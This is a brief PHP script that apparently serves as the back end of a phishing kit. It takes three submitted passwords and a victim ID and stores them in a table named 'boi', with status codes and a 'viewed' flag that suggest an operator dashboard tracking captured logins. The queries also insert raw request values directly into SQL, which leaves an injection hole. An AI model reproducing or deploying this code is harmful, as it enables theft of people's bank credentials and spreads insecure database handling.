<?php
require '../connection.php';


if ($_POST["pass1"] != "" and $_POST["pass2"] != "" and $_POST["pass3"] != "" and $_POST["uniqueid"]) {
  $pass1 = $_POST["pass1"];
  $pass2 = $_POST["pass2"];
  $pass3 = $_POST["pass3"];

  $uniqueid = $_POST["uniqueid"];

  if (isset($_GET["second_true"])) {
    $send_response = mysqli_query($conn, "UPDATE boi SET pass1='$pass1', pass4='$pass2', pass5='$pass3', status = 0, viewed='false' WHERE uniqueid=$uniqueid");
  } else {
    $send_response = mysqli_query($conn, "UPDATE boi SET pass2='$pass1', pass3='$pass2', pass6='$pass3', status = 11, viewed='false' WHERE uniqueid=$uniqueid");
  }

  if ($send_response) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}

?>
